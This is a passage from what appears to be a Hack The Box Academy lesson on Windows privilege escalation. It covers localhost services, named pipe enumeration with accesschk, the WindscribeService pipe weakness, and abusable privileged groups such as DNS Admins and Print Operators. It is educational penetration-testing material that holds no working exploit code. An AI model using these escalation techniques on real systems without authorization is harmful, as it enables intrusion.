  <span class="hljs-selector-tag">TCP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:49674</span>          0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       616
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:139</span>        0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:3389</span>       10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.14</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-pseudo">:63191</span>       <span class="hljs-selector-tag">ESTABLISHED</span>     936
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:49671</span>      40<span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.251</span><span class="hljs-selector-class">.132</span><span class="hljs-selector-pseudo">:443</span>      <span class="hljs-selector-tag">ESTABLISHED</span>     1260
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:49773</span>      52<span class="hljs-selector-class">.37</span><span class="hljs-selector-class">.190</span><span class="hljs-selector-class">.150</span><span class="hljs-selector-pseudo">:443</span>      <span class="hljs-selector-tag">ESTABLISHED</span>     2608
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:51580</span>      40<span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.251</span><span class="hljs-selector-class">.132</span><span class="hljs-selector-pseudo">:443</span>      <span class="hljs-selector-tag">ESTABLISHED</span>     3808
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:54267</span>      40<span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.254</span><span class="hljs-selector-class">.36</span><span class="hljs-selector-pseudo">:443</span>       <span class="hljs-selector-tag">ESTABLISHED</span>     3808
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:54268</span>      40<span class="hljs-selector-class">.67</span><span class="hljs-selector-class">.254</span><span class="hljs-selector-class">.36</span><span class="hljs-selector-pseudo">:443</span>       <span class="hljs-selector-tag">ESTABLISHED</span>     1260
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:54269</span>      64<span class="hljs-selector-class">.233</span><span class="hljs-selector-class">.184</span><span class="hljs-selector-class">.189</span><span class="hljs-selector-pseudo">:443</span>     <span class="hljs-selector-tag">ESTABLISHED</span>     2608
  <span class="hljs-selector-tag">TCP</span>    10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.43</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-pseudo">:54273</span>      216<span class="hljs-selector-class">.58</span><span class="hljs-selector-class">.210</span><span class="hljs-selector-class">.195</span><span class="hljs-selector-pseudo">:443</span>     <span class="hljs-selector-tag">ESTABLISHED</span>     2608
  <span class="hljs-selector-tag">TCP</span>    127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-pseudo">:14147</span>        0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       3812

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;

  <span class="hljs-selector-tag">TCP</span>    192<span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.20</span><span class="hljs-selector-class">.56</span><span class="hljs-selector-pseudo">:139</span>      0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:0</span>              <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:21</span>                <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       3812
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:80</span>                <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:135</span>               <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       836
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:445</span>               <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:3389</span>              <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       936
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:5985</span>              <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:8080</span>              <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       5044
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:47001</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       4
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49664</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       528
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49665</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       996
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49666</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       1260
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49668</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       2008
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49669</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       600
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49670</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       1888
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:49674</span>             <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       616
  <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-attr">[::1]</span><span class="hljs-selector-pseudo">:14147</span>            <span class="hljs-selector-attr">[::]</span><span class="hljs-selector-pseudo">:0</span>                 <span class="hljs-selector-tag">LISTENING</span>       3812
  <span class="hljs-selector-tag">UDP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:123</span>            *:*                                    1104
  <span class="hljs-selector-tag">UDP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:500</span>            *:*                                    1260
  <span class="hljs-selector-tag">UDP</span>    0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-pseudo">:3389</span>           *:*                                    936

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
</code></pre>
<p>The main thing to look for with Active Network Connections are entries listening on loopback addresses (<code>127.0.0.1</code> and <code>::1</code>) that are not listening on the IP Address (<code>10.129.43.8</code>) or broadcast (<code>0.0.0.0</code>, <code>::/0</code>). The reason for this is network sockets on localhost are often insecure due to the thought that &quot;they aren&#39;t accessible to the network.&quot; The one that sticks out immediately will be port <code>14147</code>, which is used for FileZilla&#39;s administrative interface. By connecting to this port, it may be possible to extract FTP passwords in addition to creating an FTP Share at c:\ as the FileZilla Server user (potentially Administrator).</p>
<p><strong>More Examples</strong></p>
<p>One of the best examples of this type of privilege escalation is the <code>Splunk Universal Forwarder</code>, installed on endpoints to send logs into Splunk. The default configuration of Splunk did not have any authentication on the software and allowed anyone to deploy applications, which could lead to code execution. Again, the default configuration of Splunk was to run it as SYSTEM$ and not a low privilege user. For more information, check out <a href="https://airman604.medium.com/splunk-universal-forwarder-hijacking-5899c3e0e6b2">Splunk Universal Forwarder Hijacking</a> and <a href="https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/">SplunkWhisperer2</a>.</p>
<p>Another overlooked but common local privilege escalation vector is the <code>Erlang Port</code> (25672). Erlang is a programming language designed around distributed computing and will have a network port that allows other Erlang nodes to join the cluster. The secret to join this cluster is called a cookie. Many applications that utilize Erlang will either use a weak cookie (RabbitMQ uses <code>rabbit</code> by default) or place the cookie in a configuration file that is not well protected. Some example Erlang applications are SolarWinds, RabbitMQ, and CouchDB. For more information check out the <a href="https://malicious.link/post/2018/erlang-arce/">Erlang-arce blogpost from Mubix</a></p>
<hr>
<h3 id="named-pipes">Named Pipes</h3>
<p>The other way processes communicate with each other is through Named Pipes. Pipes are essentially files stored in memory that get cleared out after being read. Cobalt Strike uses Named Pipes for every command (excluding <a href="https://www.cobaltstrike.com/help-beacon-object-files">BOF</a>). Essentially the workflow looks like this:</p>
<ol>
<li>Beacon starts a named pipe of \.\pipe\msagent_12</li>
<li>Beacon starts a new process and injects command into that process directing output to \.\pipe\msagent_12</li>
<li>Server displays what was written into \.\pipe\msagent_12</li>
</ol>
<p>Cobalt Strike did this because if the command being ran got flagged by antivirus or crashed, it would not affect the beacon (process running the command). Often, Cobalt Strike users will change their named pipes to masquerade as another program. One of the most common examples is mojo instead of msagent. One of my favorite findings was finding a named pipe start with mojo, but the computer itself did not have Chrome installed. Thankfully, this turned out to be the company&#39;s internal red team. It speaks volumes when an external consultant finds the red team, but the internal blue team did not.</p>
<p><strong>More on Named Pipes</strong></p>
<p>Pipes are used for communication between two applications or processes using shared memory. There are two types of pipes, <a href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">named pipes</a> and anonymous pipes. An example of a named pipe is <code>\\.\PipeName\\ExampleNamedPipeServer</code>. Windows systems use a client-server implementation for pipe communication. In this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the client. Named pipes can communicate using <code>half-duplex</code>, or a one-way channel with the client only being able to write data to the server, or <code>duplex</code>, which is a two-way communication channel that allows the client to write data over the pipe, and the server to respond back with data over that pipe. Every active connection to a named pipe server results in the creation of a new named pipe. These all share the same pipe name but communicate using a different data buffer.</p>
<p>We can use the tool <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a> from the Sysinternals Suite to enumerate instances of named pipes.</p>
<p><strong>Listing Named Pipes with Pipelist</strong></p>
<p>Communication with Processes</p>
<pre><code class="lang-cmd-session">C:\htb&gt; pipelist.exe /accepteula

PipeList v1.02 - Lists open named pipes
Copyright (C) 2005<span class="hljs-string">-2016</span> Mark Russinovich
Sysinternals - www.sysinternals.com

Pipe Name                                    Instances       Max Instances
---------                                    ---------       -------------
InitShutdown                                      3               <span class="hljs-string">-1</span>
lsass                                             4               <span class="hljs-string">-1</span>
ntsvcs                                            3               <span class="hljs-string">-1</span>
scerpc                                            3               <span class="hljs-string">-1</span>
Winsock2\CatalogChangeListener<span class="hljs-string">-340</span><span class="hljs-string">-0</span>              1                1
Winsock2\CatalogChangeListener<span class="hljs-string">-414</span><span class="hljs-string">-0</span>              1                1
epmapper                                          3               <span class="hljs-string">-1</span>
Winsock2\CatalogChangeListener<span class="hljs-string">-3</span>ec<span class="hljs-string">-0</span>              1                1
Winsock2\CatalogChangeListener<span class="hljs-string">-44</span>c<span class="hljs-string">-0</span>              1                1
LSM_API_service                                   3               <span class="hljs-string">-1</span>
atsvc                                             3               <span class="hljs-string">-1</span>
Winsock2\CatalogChangeListener<span class="hljs-string">-5</span>e0<span class="hljs-string">-0</span>              1                1
eventlog                                          3               <span class="hljs-string">-1</span>
Winsock2\CatalogChangeListener<span class="hljs-string">-6</span>a8<span class="hljs-string">-0</span>              1                1
spoolss                                           3               <span class="hljs-string">-1</span>
Winsock2\CatalogChangeListener-ec0<span class="hljs-string">-0</span>              1                1
wkssvc                                            4               <span class="hljs-string">-1</span>
trkwks                                            3               <span class="hljs-string">-1</span>
vmware-usbarbpipe                                 5               <span class="hljs-string">-1</span>
srvsvc                                            4               <span class="hljs-string">-1</span>
ROUTER                                            3               <span class="hljs-string">-1</span>
vmware-authdpipe                                  1                1

&lt;SNIP&gt;
</code></pre>
<p>Additionally, we can use PowerShell to list named pipes using <code>gci</code> (<code>Get-ChildItem</code>).</p>
<p><strong>Listing Named Pipes with PowerShell</strong></p>
<p>Communication with Processes</p>
<pre><code class="lang-powershell-session"><span class="hljs-comment">PS</span> <span class="hljs-comment">C:\htb</span>&gt;  <span class="hljs-comment">gci</span> <span class="hljs-comment">\\</span><span class="hljs-string">.</span><span class="hljs-comment">\pipe\</span>


    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">\\</span><span class="hljs-string">.</span><span class="hljs-comment">\pipe</span>


<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">3</span> <span class="hljs-comment">InitShutdown</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">4</span> <span class="hljs-comment">lsass</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">3</span> <span class="hljs-comment">ntsvcs</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">3</span> <span class="hljs-comment">scerpc</span>


    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">\\</span><span class="hljs-string">.</span><span class="hljs-comment">\pipe\Winsock2</span>


<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">1</span> <span class="hljs-comment">Winsock2\CatalogChangeListener</span><span class="hljs-literal">-</span><span class="hljs-comment">34c</span><span class="hljs-literal">-</span><span class="hljs-comment">0</span>


    <span class="hljs-comment">Directory:</span> <span class="hljs-comment">\\</span><span class="hljs-string">.</span><span class="hljs-comment">\pipe</span>


<span class="hljs-comment">Mode</span>                <span class="hljs-comment">LastWriteTime</span>         <span class="hljs-comment">Length</span> <span class="hljs-comment">Name</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>       <span class="hljs-comment">12/31/1600</span>   <span class="hljs-comment">4:00</span> <span class="hljs-comment">PM</span>              <span class="hljs-comment">3</span> <span class="hljs-comment">epmapper</span>

&lt;<span class="hljs-comment">SNIP</span>&gt;
</code></pre>
<p>After obtaining a listing of named pipes, we can use <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">Accesschk</a> to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let&#39;s take a look at the <code>LSASS</code> process. We can also review the DACLs of all named pipes using the command <code>.\accesschk.exe /accepteula \pipe\</code>.</p>
<p><strong>Reviewing LSASS Named Pipe Permissions</strong></p>
<p>Communication with Processes</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; accesschk.exe /accepteula <span class="hljs-symbol">\\</span>.<span class="hljs-symbol">\P</span>ipe<span class="hljs-symbol">\l</span>sass -v

Accesschk v6.12 - Reports effective permissions for securable objects
Copyright (C) 2006-2017 Mark Russinovich
Sysinternals - www.sysinternals.com

<span class="hljs-symbol">\\</span>.<span class="hljs-symbol">\P</span>ipe<span class="hljs-symbol">\l</span>sass
  Untrusted Mandatory Level [No-Write-Up]
  RW Everyone
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW NT AUTHORITY<span class="hljs-symbol">\A</span>NONYMOUS LOGON
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW APPLICATION PACKAGE AUTHORITY<span class="hljs-symbol">\Y</span>our Windows credentials
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
  RW BUILTIN<span class="hljs-symbol">\A</span>dministrators
        FILE_ALL_ACCESS
</code></pre>
<p>From the output above, we can see that only administrators have full access to the LSASS process, as expected.</p>
<hr>
<h3 id="named-pipes-attack-example">Named Pipes Attack Example</h3>
<p>Let&#39;s walk through an example of taking advantage of an exposed named pipe to escalate privileges. This <a href="https://www.exploit-db.com/exploits/48021">WindscribeService Named Pipe Privilege Escalation</a> is a great example. Using <code>accesschk</code> we can search for all named pipes that allow write access with a command such as <code>accesschk.exe -w \pipe\* -v</code> and notice that the <code>WindscribeService</code> named pipe allows <code>READ</code> and <code>WRITE</code> access to the <code>Everyone</code> group, meaning all authenticated users.</p>
<p><strong>Checking WindscribeService Named Pipe Permissions</strong></p>
<p>Confirming with <code>accesschk</code> we see that the Everyone group does indeed have <code>FILE_ALL_ACCESS</code> (All possible access rights) over the pipe.</p>
<p>Communication with Processes</p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb&gt; accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6<span class="hljs-number">.13</span> - Reports effective permissions for securable objects
Copyright ⌐ <span class="hljs-number">2006</span><span class="hljs-number">-2020</span> Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  <span class="hljs-keyword">Medium</span> Mandatory <span class="hljs-keyword">Level</span> (<span class="hljs-keyword">Default</span>) [No-<span class="hljs-keyword">Write</span>-<span class="hljs-keyword">Up</span>]
  RW Everyone
        FILE_ALL_ACCESS
</code></pre>
<p>From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.</p>
<h2 id="windows-privileges-overview">Windows Privileges Overview</h2>
<hr>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges">Privileges</a> in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more. Privileges are different from access rights, which a system uses to grant or deny access to securable objects. User and group privileges are stored in a database and granted via an access token when a user logs on to a system. An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain. Each time a user attempts to perform a privileged action, the system reviews the user&#39;s access token to see if the account has the required privileges, and if so, checks to see if they are enabled. Most privileges are disabled by default. Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.</p>
<p>The goal of an assessment is often to gain administrative access to a system or multiple systems. Suppose we can log in to a system as a user with a specific set of privileges. In that case, we may be able to leverage this built-in functionality to escalate privileges directly or use the target account&#39;s assigned privileges to further our access in pursuit of our ultimate goal.</p>
<hr>
<h3 id="windows-authorization-process">Windows Authorization Process</h3>
<p>Security principals are anything that can be authenticated by the Windows operating system, including user and computer accounts, processes that run in the security context or another user/computer account, or the security groups that these accounts belong to. Security principals are the primary way of controlling access to resources on Windows hosts. Every single security principal is identified by a unique <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">Security Identifier (SID)</a>. When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime.</p>
<p>The below diagram walks through the Windows authorization and access control process at a high level, showing, for example, the process started when a user attempts to access a securable object such as a folder on a file share. During this process, the user&#39;s access token (including their user SID, SIDs for any groups they are members of, privilege list, and other access information) is compared against <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-entries">Access Control Entries (ACEs)</a> within the object&#39;s <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/security-descriptors">security descriptor</a> (which contains security information about a securable object such as access rights (discussed below) granted to users or groups). Once this comparison is complete, a decision is made to either grant or deny access. This entire process happens almost instantaneously whenever a user tries to access a resource on a Windows host. As part of our enumeration and privilege escalation activities, we attempt to use and abuse access rights and leverage or insert ourselves into this authorization process to further our access towards our goal.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/67/auth\_process.png" alt="image"></p>
<p><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-principals">Image source</a></p>
<hr>
<h3 id="rights-and-privileges-in-windows">Rights and Privileges in Windows</h3>
<p>Windows contains many groups that grant their members powerful rights and privileges. Many of these can be abused to escalate privileges on both a standalone Windows host and within an Active Directory domain environment. Ultimately, these may be used to gain Domain Admin, local administrator, or SYSTEM privileges on a Windows workstation, server, or Domain Controller (DC). Some of these groups are listed below.</p>
<table>
<thead>
<tr>
<th><strong>Group</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Default Administrators</td>
<td>Domain Admins and Enterprise Admins are &quot;super&quot; groups.</td>
</tr>
<tr>
<td>Server Operators</td>
<td>Members can modify services, access SMB shares, and backup files.</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.</td>
</tr>
<tr>
<td>Print Operators</td>
<td>Members can log on to DCs locally and &quot;trick&quot; Windows into loading a malicious driver.</td>
</tr>
<tr>
<td>Hyper-V Administrators</td>
<td>If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.</td>
</tr>
<tr>
<td>Account Operators</td>
<td>Members can modify non-protected accounts and groups in the domain.</td>
</tr>
<tr>
<td>Remote Desktop Users</td>
<td>Members are not given any useful permissions by default but are often granted additional rights such as <code>Allow Login Through Remote Desktop Services</code> and can move laterally using the RDP protocol.</td>
</tr>
<tr>
<td>Remote Management Users</td>
<td>Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).</td>
</tr>
<tr>
<td>Group Policy Creator Owners</td>
<td>Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.</td>
</tr>
<tr>
<td>Schema Admins</td>
<td>Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.</td>
</tr>
<tr>
<td>DNS Admins</td>
<td>Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to <a href="https://cube0x0.github.io/Pocing-Beyond-DA/">create a WPAD record</a>.</td>
</tr>
</tbody>
</table>
<hr>
<h3 id="user-rights-assignment">User Rights Assignment</h3>
<p>Depending on group membership, and other factors such as privileges assigned via domain and local Group Policy, users can have various rights assigned to their account. This Microsoft article on <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment">User Rights Assignment</a> provides a detailed explanation of each of the user rights that can be set in Windows as well as security considerations applicable to each right. Below are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, shut down the server, etc.</p>
<table>
<thead>
<tr>
<th>Setting <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">Constant</a></th>
<th>Setting Name</th>
<th>Standard Assignment</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>SeNetworkLogonRight</td>
<td><a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network">Access this computer from the network</a></td>
<td>Administrators, Authenticated Users</td>
<td>Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.</td>
